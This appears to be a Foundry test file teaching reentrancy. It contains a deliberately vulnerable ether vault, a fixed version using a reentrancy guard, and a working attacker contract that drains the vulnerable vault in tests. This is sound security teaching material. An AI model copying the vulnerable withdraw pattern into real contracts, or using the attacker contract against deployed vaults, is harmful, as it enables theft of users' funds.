// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract VulnerableEtherVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "eth transfer failed");

        balances[msg.sender] = 0;
    }

    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract FixedEtherVault is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");

        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "eth transfer failed");
    }

    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentrancyAttacker {
    VulnerableEtherVault public vulnerableVault;
    FixedEtherVault public fixedVault;

    bool public attackFixedMode;
    uint256 public attackCount;

    constructor(VulnerableEtherVault _vulnerableVault, FixedEtherVault _fixedVault) {
        vulnerableVault = _vulnerableVault;
        fixedVault = _fixedVault;
    }

    receive() external payable {
        attackCount++;

        if (attackFixedMode) {
            if (address(fixedVault).balance >= 1 ether && attackCount < 3) {
                fixedVault.withdraw();
            }
        } else {
            if (address(vulnerableVault).balance >= 1 ether && attackCount < 3) {
                vulnerableVault.withdraw();
            }
        }
    }

    function attackVulnerable() external payable {
        require(msg.value == 1 ether, "need 1 ether");

        vulnerableVault.deposit{value: 1 ether}();
        vulnerableVault.withdraw();
    }

    function attackFixed() external payable {
        require(msg.value == 1 ether, "need 1 ether");

        attackFixedMode = true;

        fixedVault.deposit{value: 1 ether}();
        fixedVault.withdraw();
    }
}

contract ReentrancyCaseStudyTest is Test {
    VulnerableEtherVault vulnerableVault;
    FixedEtherVault fixedVault;
    ReentrancyAttacker attacker;

    address victim = address(0xA11CE);
    address hacker = address(0xBAD);

    function setUp() public {
        vulnerableVault = new VulnerableEtherVault();
        fixedVault = new FixedEtherVault();
        attacker = new ReentrancyAttacker(vulnerableVault, fixedVault);

        vm.deal(victim, 10 ether);
        vm.deal(hacker, 10 ether);

        vm.prank(victim);
        vulnerableVault.deposit{value: 5 ether}();

        vm.prank(victim);
        fixedVault.deposit{value: 5 ether}();
    }

    function testVulnerableVaultCanBeDrainedByReentrancy() public {
        assertEq(address(vulnerableVault).balance, 5 ether);

        vm.prank(hacker);
        attacker.attackVulnerable{value: 1 ether}();

        assertGt(address(attacker).balance, 1 ether);
        assertLt(address(vulnerableVault).balance, 5 ether);
    }

    function testFixedVaultBlocksReentrancy() public {
        assertEq(address(fixedVault).balance, 5 ether);

        vm.prank(hacker);
        vm.expectRevert();
        attacker.attackFixed{value: 1 ether}();

        assertEq(address(fixedVault).balance, 5 ether);
    }

    function testFixedVaultNormalWithdrawWorks() public {
        vm.prank(victim);
        fixedVault.withdraw();

        assertEq(address(fixedVault).balance, 0);
        assertEq(fixedVault.balances(victim), 0);
    }
}